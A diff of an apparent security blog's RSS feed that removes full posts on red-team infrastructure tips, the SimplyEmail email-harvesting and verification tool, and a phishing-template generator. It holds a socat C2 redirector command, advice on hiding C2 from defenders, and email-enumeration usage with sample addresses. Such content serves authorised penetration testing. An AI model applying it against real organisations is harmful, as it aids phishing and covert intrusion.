-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/vps_redirectors.jpg&#34; alt=&#34;red team redirctors&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-&lt;/p&gt;
-
-&lt;p&gt;If you have the time I highly suggest looking at CobaltStikes video on setting up redirectors as this will most likely apply to multiple situations or tools. In most cases, i have found during my setup that Socat was reliable and solid as a brick. I even started asking around and it seems it&amp;rsquo;s the go too. Here is the Socat example from CobaltStrike, the video below is a great walk through of this process:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;socat TCP4-LISTEN:80,fork TCP4:54.197.3.16:80
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/PyJu_LYosts&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;5. Full Session / Metadata Network Capture on Redirectors and C2:&lt;/strong&gt;
-I know you going to question this! Well, its necessary after recent events with cobalt strike and Metasploit our tools are being targeted! I know asking for full PCAP on our redirectors will not be possible for most, while ill be shooting for a certain retention time on core architecture we need at least PCAP metadata (IP SRC/DST, PORT SRC/DST). This can be a simple text file, but this will give you something to go back to god forbid you have multiple redirectors and need to find an originating point of a callback. Something as simple as this can give you a ton of insight if an incident does happen. But in today&amp;rsquo;s age maybe we should be shooting for full pcap? What do you think? It could be as simple as this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ sudo tcpdump -n &amp;gt; test.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;6. Never Share C2 IOC’s!&lt;/strong&gt; Let’s be honest we have gone far out of our way to stand up and build solid and secure architecture, let’s not get its all burnt with one mistake. When we hear IOC we think malware etc, in this case, we mean IOC’s that would link or unravel our C2 easily without a full blown investigation.&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;Do not share domain names by using sub-domains across any part of the separate core C2 servers.&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Register all domain with different POCs or only use private registration. With new tools like Whoisology.com doing reverse register name lookups takes seconds. Within minutes the blue team will be able to use hard indicators to destroy your foothold. Take a look at the ease of finding connected domains:
-&lt;iframe src=&#34;https://player.vimeo.com/video/194049240?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;372&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;We setup three servers for Phishing, Active OP’s, and Long Term and we put them all in the same geographical region and /24 IP-space. Well, that was an easy win for the blue team! Please use separate geographical regions and IP-space for redirectors and core C2 servers.&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;I have seen this done often and it&amp;rsquo;s generally not an issue, but if you use the same C2 transport for all three separate servers you may have just burnt it all. Let’s say I use CS-HTTP stagers and the blue team catches my phishing server. That team is going to write custom signatures to ID that sort of traffic. Take the time use DNS/HTTP/HTTPS at all stages to give them a treat&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Following the last recommendation CS supports malleable C2 profiles, use them they work trust me! With that, you need to be careful if your target is Government related think twice with using streaming services. Use this in good taste or write custom ones that your target will most likely use, and think about what they may block.&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Going to host a payload? Take the time and stand up a custom droplet and web server to host payloads that will be used for phishing or lateral movement. This way you&amp;rsquo;re not opening your core C2 to more potential attack surface. Go ahead and look at my baseline apache server, you’re not going to get far.&lt;/p&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/vps_full_setup.jpg&#34; alt=&#34;red team redirctors&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;hr /&gt;
-
-&lt;p&gt;Any questions or concerns do not hastate to ask, as always hope I was able to share some basic tips for your next engagement.&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/11/top-red-team-tips/</guid>
+      <description>TL;DR  CLI Logging of All Operator Terminal Restricted Payload Delivery Separate Servers / C2 Phases for all Stages of an Engagement Always Use Redirectors in Front of Core C2 Full Session / Metadata Network Capture on Redirectors and C2 Never Share C2 IOC’s  As some of you may know I made a huge transition recently from my former team ATD (Adaptive Threat Division) at Veris Group to Sony’s internal Red Team.</description>
     </item>
     
     <item>
       <title>SimplyEmail</title>
-      <link>https://cybersyndicates.com/project/SimplyEmail/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/project/simplyemail/</link>
       <pubDate>Fri, 18 Nov 2016 02:13:50 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/project/SimplyEmail/</guid>
-      <description>
-
-&lt;p&gt;&lt;img src=&#34;https://simplyemail.org/img/se-logo-2.png&#34; alt=&#34;alt text&#34; title=&#34;Logo Title Text 1&#34; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&#34;simplyemail&#34;&gt;SimplyEmail&lt;/h1&gt;
-
-&lt;p&gt;What is the simple email recon tool? This tool was based off the work of theHarvester and kind of a port of the functionality. This was just an expansion of what was used to build theHarvester and will incorporate his work but allow users to easily build Modules for the Framework. Which I felt was desperately needed after building my first module for theHarvester.&lt;/p&gt;
-
-&lt;p&gt;MAJOR CALLOUTS:
-- @laramies - Developer of theHarvester tool &lt;a href=&#34;https://github.com/laramies/theHarvester&#34;&gt;https://github.com/laramies/theHarvester&lt;/a&gt;
-- @CptJesus - Helped dev framework&lt;/p&gt;
-
-&lt;h2 id=&#34;work-conducted-by&#34;&gt;Work Conducted by:&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Alexander Rymdeko-Harvey [Twitter] @Killswitch-GUI &amp;ndash; [Web] &lt;a href=&#34;http://cybersyndicates.com&#34;&gt;CyberSydicates.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Keelyn Roberts [Twitter] @real_slacker007 &amp;ndash; [Web] &lt;a href=&#34;http://cybersyndicates.com&#34;&gt;CyberSydicates.com&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyEmail&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;scrape-everything-simply&#34;&gt;Scrape EVERYTHING - Simply&lt;/h2&gt;
-
-&lt;p&gt;Current Platforms Supported:
-* Kali Linux 2.0
-* Kali Linux 1.0
-* Debian (deb8u3)&lt;/p&gt;
-
-&lt;p&gt;A few small benefits:
-- Easy for you to write modules (All you need is 1 required Class option and you&amp;rsquo;re up and running)
-- Use the built in Parsers for rawest results
-- Multiprocessing Queue for modules and Result Queue for easy handling of Email data
-- Simple integration  of theHarvester Modules and new ones to come
-- Also the ability to change major settings fast without diving into the code&lt;/p&gt;
-
-&lt;p&gt;API Based Searches:
-- When API based searches become available, no need to add them to the Command line
-- API keys will be auto pulled from the SimpleEmail.ini, this will activate the module for use&lt;/p&gt;
-
-&lt;h2 id=&#34;get-started-on-deb&#34;&gt;Get Started on Deb&lt;/h2&gt;
-
-&lt;p&gt;Please RUN the simple Setup Bash script!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-Bash&#34;&gt;# sh Setup.sh
-or
-# ./Setup.sh
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;get-started-in-kali&#34;&gt;Get Started in Kali&lt;/h2&gt;
-
-&lt;p&gt;Please RUN the simple Setup Bash script!
-NOTE: At the moment the up-streeam debian python-futures contain bugs within configparser / python-magic. This has been reported to KALI and debiab.
-configparser bug in apt-get python-futures: &lt;a href=&#34;https://bugs.kali.org/view.php?id=3245&#34;&gt;https://bugs.kali.org/view.php?id=3245&lt;/a&gt;
-SimplyEmail bug reported: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/issues/11&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/issues/11&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;FIX KALI BUG: 
-# apt-get remove configparser
-# apt-get remove python-magic
-or 
-# apt-get remove python-futures
-
-Normal Setup
-# ./Setup.sh
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;get-started-on-mac-osx-at-own-risk&#34;&gt;Get Started on Mac OSX (At own risk)&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code&gt;Install brew:
-https://coolestguidesontheplanet.com/installing-homebrew-on-os-x-el-capitan-10-11-package-manager-for-unix-apps/
-
-$ sudo easy_install pip
-$ sudo brew install libmagic
-$ pip install python-magic
-$ ./Setup.sh
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;standard-help&#34;&gt;Standard Help&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code&gt; ============================================================
- Current Version: v1.4.2 | Website: CyberSyndicates.com
- ============================================================
- Twitter: @real_slacker007 |  Twitter: @Killswitch_gui
- ============================================================
-------------------------------------------------------------
-   ______  ________                       __ __
- /      \/        |                     /  /  |
-/$$$$$$  $$$$$$$$/ _____  ____   ______ $$/$$ |
-$$ \__$$/$$ |__   /     \/    \ /      \/  $$ |
-$$      \$$    |  $$$$$$ $$$$  |$$$$$$  $$ $$ |
- $$$$$$  $$$$$/   $$ | $$ | $$ |/    $$ $$ $$ |
-/  \__$$ $$ |_____$$ | $$ | $$ /$$$$$$$ $$ $$ |
-$$    $$/$$       $$ | $$ | $$ $$    $$ $$ $$ |
- $$$$$$/ $$$$$$$$/$$/  $$/  $$/ $$$$$$$/$$/$$/
-
-------------------------------------------------------------
-usage: SimplyEmail.py [-all] [-e company.com] [-l] [-t html / flickr / google]
-                      [-s] [-n] [-verify] [-v] [--json json-emails.txt]
-
-Email enumeration is a important phase of so many operation that a pen-tester
-or Red Teamer goes through. There are tons of applications that do this but I
-wanted a simple yet effective way to get what Recon-Ng gets and theHarvester
-gets. (You may want to run -h)
-
-optional arguments:
-  -all                  Use all non API methods to obtain Emails
-  -e company.com        Set required email addr user, ex ale@email.com
-  -l                    List the current Modules Loaded
-  -t html / flickr / google
-                        Test individual module (For Linting)
-  -s                    Set this to enable &#39;No-Scope&#39; of the email parsing
-  -n                    Set this to enable Name Generation
-  -verify               Set this to enable SMTP server email verify
-  -v                    Set this switch for verbose output of modules
-  --json json-emails.txt
-                        Set this switch for json output to specfic file
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;run-simplyemail&#34;&gt;Run SimplyEmail&lt;/h3&gt;
-
-&lt;p&gt;Let&amp;rsquo;s say your target is cybersyndicates.com&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;./SimplyEmail.py -all -e cybersyndicates.com
-
-or in verbose
-./SimplyEmail.py -all -v -e cybersyndicates.com
-
-or in verbose and no &amp;quot;Scope&amp;quot;
-./SimplyEmail.py -all -v -e cybersyndicates.com -s
-
-or with email verification
-./SimplyEmail.py -all -v -verify -e cybersyndicates.com 
-
-or with email verification &amp;amp; Name Creation
-./SimplyEmail.py -all -v -verify -n -e cybersyndicates.com 
-
-or json automation
-./SimplyEmail.py -all -e cybersyndicates.com --json cs-json.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This will run ALL modules that are have API Key placed in the SimpleEmail.ini file and will run all non-API based modules.&lt;/p&gt;
-
-&lt;h3 id=&#34;list-modules-simpleemail&#34;&gt;List Modules SimpleEmail&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code&gt;root@kali:~/Tools/SimplyEmail# ./SimplyEmail.py -l
- ============================================================
- Current Version: v0.7 | Website: CyberSyndicates.com
- ============================================================
- Twitter: @real_slacker007 |  Twitter: @Killswitch_gui
- ============================================================
-------------------------------------------------------------
-   ______  ________                       __ __
- /      \/        |                     /  /  |
-/$$$$$$  $$$$$$$$/ _____  ____   ______ $$/$$ |
-$$ \__$$/$$ |__   /     \/    \ /      \/  $$ |
-$$      \$$    |  $$$$$$ $$$$  |$$$$$$  $$ $$ |
- $$$$$$  $$$$$/   $$ | $$ | $$ |/    $$ $$ $$ |
-/  \__$$ $$ |_____$$ | $$ | $$ /$$$$$$$ $$ $$ |
-$$    $$/$$       $$ | $$ | $$ $$    $$ $$ $$ |
- $$$$$$/ $$$$$$$$/$$/  $$/  $$/ $$$$$$$/$$/$$/
-
-------------------------------------------------------------
- [*] Available Modules are:
-
-  1)  Modules/HtmlScrape.py   
-  2)  Modules/PasteBinSearch.py
-  3)  Modules/ExaleadSearch.py
-  4)  Modules/SearchPGP.py    
-  5)  Modules/ExaleadXLSXSearch.py
-  6)  Modules/ExaleadDOCXSearch.py
-  7)  Modules/OnionStagram.py 
-  8)  Modules/GooglePDFSearch.py
-  9)  Modules/RedditPostSearch.py
-  10) Modules/AskSearch.py    
-  11) Modules/EmailHunter.py  
-  12) Modules/WhoisAPISearch.py
-  13) Modules/Whoisolgy.py    
-  14) Modules/GoogleDocxSearch.py
-  15) Modules/GitHubUserSearch.py
-  16) Modules/YahooSearch.py  
-  17) Modules/GitHubCodeSearch.py
-  18) Modules/ExaleadPDFSearch.py
-  19) Modules/GoogleSearch.py 
-  20) Modules/FlickrSearch.py 
-  21) Modules/GoogleDocSearch.py
-  22) Modules/CanaryBinSearch.py
-  23) Modules/ExaleadDOCSearch.py
-  24) Modules/GoogleXLSXSearch.py
-  25) Modules/GitHubGistSearch.py
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;api-modules-and-searches&#34;&gt;API Modules and Searches&lt;/h2&gt;
-
-&lt;p&gt;API based searches can be painful and hard to configure. The main aspect of SimplyEmail is to easily integrate these aspects, while not compromising the ease of using this tool. Using the configuration file, you can simply add your corresponding API key and get up and running. Modules are automatically identified as API based searches, checks if the corresponding keys are present and if the keys are present it will run the module.&lt;/p&gt;
-
-&lt;h3 id=&#34;canar-io-api-search&#34;&gt;Canar.io API Search&lt;/h3&gt;
-
-&lt;p&gt;Canario is a service that allows you to search for potentially leaked data that has been exposed on the Internet. Passwords, e-mail addresses, hostnames, and other data have been indexed to allow for easy searching.&lt;/p&gt;
-
-&lt;p&gt;Simply Register for a key here:
-&lt;a href=&#34;https://canar.io/register/&#34;&gt;canar.io&lt;/a&gt; or &lt;a href=&#34;https://canar.io/register/&#34;&gt;https://canar.io/register/&lt;/a&gt;
-Place the key in the SimplyEmail.ini at [APIKeys] section, the module will now initiate when the &amp;ndash;all flag is user of the -t.&lt;/p&gt;
-
-&lt;h2 id=&#34;name-generation&#34;&gt;Name Generation&lt;/h2&gt;
-
-&lt;p&gt;Some times SimplyEmail will only find the standard email addresses or just a few emails. In this case email creation may be your saving grace. Using name generation can allow you not only scrape names from diffrent sites but allow you to auto detect the format to some accuracy.&lt;/p&gt;
-
-&lt;h3 id=&#34;linkedin-name-generation&#34;&gt;LinkedIn Name Generation&lt;/h3&gt;
-
-&lt;p&gt;Using Bing and work from PhishBait I was able to implement LinkedIn name lookups from the company name.&lt;/p&gt;
-
-&lt;h3 id=&#34;connect6-com-name-generation&#34;&gt;Connect6.com Name Generation&lt;/h3&gt;
-
-&lt;p&gt;Connect6 is also a great source for names, and also a bit flaky to find the source. Using a AutoUrl function I built I do attempt to find the correct URL for you. If not I provide you with a few more to pick from.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt; ============================================================
- Current Version: v1.1 | Website: CyberSyndicates.com
- ============================================================
- Twitter: @real_slacker007 |  Twitter: @Killswitch_gui
- ============================================================
- [*] Now Starting Connect6 Scrape:
- [*] SimplyEmail has attempted to find correct URL for Connect6:
-     URL detected: www.connect6.com/Vfffffff,%20LLC/c 
- [&amp;gt;] Is this URL correct?: n
-    Potential URL: www.connect6.com/Vffffffff,%20LLC/c 
-    Potential URL: www.connect6.com/fffffff/p/181016043240247014147078237069133079124017210127108009097255039209172025193089206212192166241042174198072085028234035215132077249038065254013074 
-    Potential URL: www.connect6.com/Cfffff/p/034097047081090085111147210185030172009078049169022098212236211095220195001177030045187199131226210223245205084079141193247011181189036140240023 
-    Potential URL: www.connect6.com/Jfffffff/p/102092136035048036136024218227078226242230121102078233031208236153124239181008089103120004217018 
-    Potential URL: www.connect6.com/Adam-Salerno/p/021252074213080142144144173151186084054192089124012168233122054057047043085086050013217026242085213002224084036030244077024184140161144046156080 
- [!] GoogleDork This: site:connect6.com &amp;quot;Vfffff.com&amp;quot;
- [-] Commands Supported: (B) ack - (R) etry
- [&amp;gt;] Please Provid a URL: b
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;verifying-emails-via-target-smtp-server&#34;&gt;Verifying Emails via target SMTP server:&lt;/h2&gt;
-
-&lt;p&gt;More often than not you will have at least a few invalid emails gathered from recon. SimplyEmail now supports
-the ability to verify and check if the email is valid.
-- Looks up MX records
-- Sorts based on priority
-- Checks if SMTP server will respond other than 250
-- If the server is suitable, checks for 250 codes
-- Outputs a (.txt) file with verified emails.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;============================================================
- Curent Version: v1.0 | Website: CyberSyndicates.com
- ============================================================
- Twitter: @real_slacker007 |  Twitter: @Killswitch_gui
- ============================================================
- [*] Email reconnaissance has been completed:
-
-    Email verification will allow you to use common methods
-    to attempt to enumerate if the email is valid.
-    This grabs the MX records, sorts and attempts to check
-    if the SMTP server sends a code other than 250 for known bad addresses
-
- [&amp;gt;] Would you like to verify email(s)?: y
- [*] Attempting to resolve MX records!
- [*] MX Host: gmail-smtp-in.l.google.com.
- [*] Checking for valid email: alwathiqlegaltranslation@gmail.com
- [!] Email seems valid: alwathiqlegaltranslation@gmail.co
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;understanding-reporting-options&#34;&gt;Understanding Reporting Options:&lt;/h2&gt;
-
-&lt;p&gt;One of the most frustrating aspects of Pen-testing is the tools&amp;rsquo; ability
-to report the findings and make those easily readable. This may be for the data
-provided to a customer or just the ability to report on source of the data.&lt;/p&gt;
-
-&lt;p&gt;So I&amp;rsquo;m making it my goal for my tools to take that work off your back and make it as simple as possible!
-Let&amp;rsquo;s cover the two different reports generated.&lt;/p&gt;
-
-&lt;h3 id=&#34;text-output&#34;&gt;Text Output:&lt;/h3&gt;
-
-&lt;p&gt;With this option results are generated and appended to a running text file called Email_List.txt.
-this makes it easy to find past searches or export to tool of choice. Example:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;  ----------------------------------
-  Email Recon: 11/11/2015 05:13:32
-  ----------------------------------
-bo@mandiant.com
-in@mandiant.com
-sc@mandiant.com
-je@mandiant.com
-su@mandiant.com
-----------------------------------
-  Email Recon: 11/11/2015 05:15:42
-  ----------------------------------
-bo@mandiant.com
-in@mandiant.com
-sc@mandiant.com
-je@mandiant.com
-su@mandiant.com
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;json-output&#34;&gt;JSON Output&lt;/h3&gt;
-
-&lt;p&gt;using the &lt;code&gt;--json test.txt&lt;/code&gt; flag will alow you to output standard JSON text file for automation needs. This can be currently used with the email scraping portion only, maybe name generation and email verification to come. These helpers will be soon in the SQL DB and API for more streamline automation. Example output:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;{
-    &amp;quot;current_version&amp;quot;: &amp;quot;v1.4.1&amp;quot;, 
-    &amp;quot;data_of_collection&amp;quot;: &amp;quot;26/06/2016&amp;quot;, 
-    &amp;quot;domain_of_collection&amp;quot;: &amp;quot;---SNIP---&amp;quot;, 
-    &amp;quot;email_collection_count&amp;quot;: 220, 
-    &amp;quot;emails&amp;quot;: [
-        {
-            &amp;quot;collection_data&amp;quot;: &amp;quot;26/06/2016&amp;quot;, 
-            &amp;quot;collection_time&amp;quot;: &amp;quot;18:47:42&amp;quot;, 
-            &amp;quot;email&amp;quot;: &amp;quot;---SNIP---&amp;quot;, 
-            &amp;quot;module_name&amp;quot;: &amp;quot;Searching PGP&amp;quot;
-        }, 
-       ---SNIP---
-        {
-            &amp;quot;collection_data&amp;quot;: &amp;quot;26/06/2016&amp;quot;, 
-            &amp;quot;collection_time&amp;quot;: &amp;quot;18:51:46&amp;quot;, 
-            &amp;quot;email&amp;quot;: &amp;quot;---SNIP---&amp;quot;, 
-            &amp;quot;module_name&amp;quot;: &amp;quot;Exalead PDF Search for Emails&amp;quot;
-        }
-    ], 
-    &amp;quot;time_of_collection&amp;quot;: &amp;quot;18:53:04&amp;quot;, 
-    &amp;quot;tool_of_collection&amp;quot;: &amp;quot;SimplyEmail&amp;quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;html-output&#34;&gt;HTML Output:&lt;/h3&gt;
-
-&lt;p&gt;As I mentioned before a powerful function that I wanted to integrate was the ability to produce a visually appealing and rich report for the user and potentially something that could be part of data provided to a client. Please let me know with suggestions!&lt;/p&gt;
-
-&lt;h4 id=&#34;email-source&#34;&gt;Email Source:&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://cybersyndicates.com/bootstrap-3.3.5/Screen Shot 2015-11-11 at 5.27.15 PM.png?raw=true&#34; alt=&#34;Alt text&#34; title=&#34;Report&#34; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;email-section&#34;&gt;Email Section:&lt;/h4&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Html report now shows Alerts for Canary Search Results!
-&lt;img src=&#34;https://cybersyndicates.com/bootstrap-3.3.5/Screen Shot 2015-11-11 at 5.27.31 PM.png?raw=true&#34; alt=&#34;Alt text&#34; title=&#34;Report Html&#34; /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&#34;current-email-evasion-techniques&#34;&gt;Current Email Evasion Techniques&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;The following will be built into the Parser Soon:&lt;/li&gt;
-&lt;li&gt;shinichiro.hamaji &lt;em&gt;at&lt;/em&gt; gmail.com&lt;/li&gt;
-&lt;li&gt;shinichiro.hamaji &lt;em&gt;AT&lt;/em&gt; gmail.com&lt;/li&gt;
-&lt;li&gt;simohayha.bobo at gmail.com&lt;/li&gt;
-&lt;li&gt;&amp;ldquo;jeffreytgilbert&amp;rdquo; =&amp;gt; &amp;ldquo;gmail.com&amp;rdquo;&lt;/li&gt;
-&lt;li&gt;felix021 # gmail.com&lt;/li&gt;
-&lt;li&gt;hirokidaichi[at]gmail.com&lt;/li&gt;
-&lt;li&gt;hirokidaichi[@]gmail.com&lt;/li&gt;
-&lt;li&gt;hirokidaichi[#]gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron{ at }gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron{at}gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron{@}gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron(@)gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron + gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron ++ gmail.com&lt;/li&gt;
-&lt;li&gt;xaicron ## gmail.com&lt;/li&gt;
-&lt;li&gt;bekt17[@]gmail.com&lt;/li&gt;
-&lt;li&gt;billy3321 -AT- gmail.com&lt;/li&gt;
-&lt;li&gt;billy3321[AT]gmail.com&lt;/li&gt;
-&lt;li&gt;ybenjo.repose [[[at]]] gmail.com&lt;/li&gt;
-&lt;li&gt;sudhindra.r.rao (at) gmail.com&lt;/li&gt;
-&lt;li&gt;sudhindra.r.rao nospam gmail.com&lt;/li&gt;
-&lt;li&gt;shinichiro.hamaji (.) gmail.com&lt;/li&gt;
-&lt;li&gt;shinichiro.hamaji&amp;ndash;at&amp;ndash;gmail.com&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&#34;todo&#34;&gt;TODO:&lt;/h4&gt;
-
-&lt;pre&gt;&lt;code&gt;Modules Under Dev:
------------------------------
-( ) StartPage Search (can help with captcha issues)
-( ) Searching SEC Data
-( ) PwnBin Search 
-( ) Past Data Dumps
-( ) psbdmp API Based and non Alert
-
-Framework Under Dev:
------------------------------
-( ) New Parsers to clean results
-( ) Fix import errors with Glob
-( ) Add in &amp;quot;[@]something.com&amp;quot; to search Regex and engines
-( ) Add Threading/Multi to GitHub Search
-( ) Add Source of collection to HTML Output
-
-Current Issues:
------------------------------
-( ) PDF miner Text Extraction Error
-( ) Verify Emails function and only one name list raises errors
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://travis-ci.org/killswitch-GUI/SimplyEmail&#34;&gt;&lt;img src=&#34;https://travis-ci.org/killswitch-GUI/SimplyEmail.svg?branch=master&#34; alt=&#34;Build Status&#34; /&gt;&lt;/a&gt;
-&lt;a href=&#34;https://landscape.io/github/killswitch-GUI/SimplyEmail/master&#34;&gt;&lt;img src=&#34;https://landscape.io/github/killswitch-GUI/SimplyEmail/master/landscape.svg?style=flat&#34; alt=&#34;Code Health&#34; /&gt;&lt;/a&gt;
-&lt;a href=&#34;https://www.codacy.com/app/iamfree2009/SimplyEmail&#34;&gt;&lt;img src=&#34;https://api.codacy.com/project/badge/grade/3b8a338b659e425e9b4e1db9eace61d7&#34; alt=&#34;Codacy Badge&#34; /&gt;&lt;/a&gt;
-&lt;a href=&#34;https://coveralls.io/github/killswitch-GUI/SimplyEmail?branch=Version-1.4&#34;&gt;&lt;img src=&#34;https://coveralls.io/repos/github/killswitch-GUI/SimplyEmail/badge.svg?branch=Version-1.4&#34; alt=&#34;Coverage Status&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/project/simplyemail/</guid>
+      <description>SimplyEmail What is the simple email recon tool? This tool was based off the work of theHarvester and kind of a port of the functionality. This was just an expansion of what was used to build theHarvester and will incorporate his work but allow users to easily build Modules for the Framework. Which I felt was desperately needed after building my first module for theHarvester.
+MAJOR CALLOUTS: - @laramies - Developer of theHarvester tool https://github.</description>
     </item>
     
     <item>
       <title>SimplyTemplate</title>
-      <link>https://cybersyndicates.com/project/SimplyTemplate/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/project/simplytemplate/</link>
       <pubDate>Tue, 01 Nov 2016 02:13:50 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/project/SimplyTemplate/</guid>
-      <description>
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyTemplate&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h1 id=&#34;simplytemplate&#34;&gt;SimplyTemplate&lt;/h1&gt;
-
-&lt;p&gt;Phishing Template Generation Made Easy. The goal of this project was to hopefully speed up Phishing
-Template Gen as well as an easy way to ensure accuracy of your templates. Currently my standard Method
-of delivering emails is the Spear Phish in Cobalt strike so you will see proper settings for that by default.&lt;/p&gt;
-
-&lt;p&gt;Current Platforms Supported:
-* Kali Linux 2.0
-* Kali Linux 1.0
-* Debian (deb8u3)&lt;/p&gt;
-
-&lt;h2 id=&#34;work-conducted-by&#34;&gt;Work Conducted by:&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Alexander Rymdeko-Harvey [Twitter] @Killswitch-GUI &amp;ndash; [Web] &lt;a href=&#34;http://cybersyndicates.com&#34;&gt;CyberSydicates.com&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&#34;major-call-outs&#34;&gt;Major Call Outs!:&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Chris Ross [@xorrior]&lt;/li&gt;
-&lt;li&gt;Steve Borosh [@rvrsh3ll] &amp;ndash; [web] &lt;a href=&#34;http://www.rvrsh3ll.net/blog/&#34;&gt;www.rvrsh3ll.net&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;A few small benefits:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Easy for you to write modules (All you need is 1 required Class option and you&amp;rsquo;re up and running)&lt;/li&gt;
-&lt;li&gt;Simple integration of Email Templates&lt;/li&gt;
-&lt;li&gt;Also the ability to change major settings fast without diving into the code (Coming)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&#34;understanding-module-types&#34;&gt;Understanding Module Types&lt;/h2&gt;
-
-&lt;p&gt;All templates will provide you with a small meta tag. This tag will help you quickly identify the
-capabilities of the module, also what the &amp;ldquo;content&amp;rdquo; supports.&lt;/p&gt;
-
-&lt;p&gt;Sophistication Levels:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;- High   ==  Requires proper OSINT / SE to build and effectively deploy the template. These are generally internal based templates with specific themes.
-- Medium ==  Requires a decent amount of modifications or settings, and are more general of a template external based template.
-- Low    ==  Requires little to no modifications of the template and are generally not effective.
